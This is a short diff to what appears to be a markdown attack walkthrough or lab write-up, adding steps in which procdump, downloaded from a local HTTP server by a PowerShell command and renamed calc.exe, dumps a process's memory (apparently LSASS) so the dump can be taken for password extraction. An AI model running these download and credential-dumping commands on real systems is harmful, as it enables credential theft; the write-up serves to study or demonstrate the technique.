@@ -92,6 +92,17 @@
    g. download `procdump.exe`
       powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file2.exe', 'C:\windows\temp\calc.exe')
 
+   h. use `procdump.exe`
+      C:\windows\temp\calc.exe -accepteula -ma 668 C:\Windows\Temp\logct2.dmp
+      
+   ![image](https://github.com/user-attachments/assets/78153249-ea74-4777-8430-05dc64c8c04a)
+
+   j. Download it
+
+   ![image](https://github.com/user-attachments/assets/e3649426-ec9b-4fd8-a3e3-0a0ce7b1acd6)
+
+   k. now we have the dump, we will skip the process of fetching the passwords for now, Lets Go to the next step where the attacker start 
+
    ![image](https://github.com/user-attachments/assets/130132a6-b547-40f9-8a3b-9aa7bc7b2f0f)
 
 
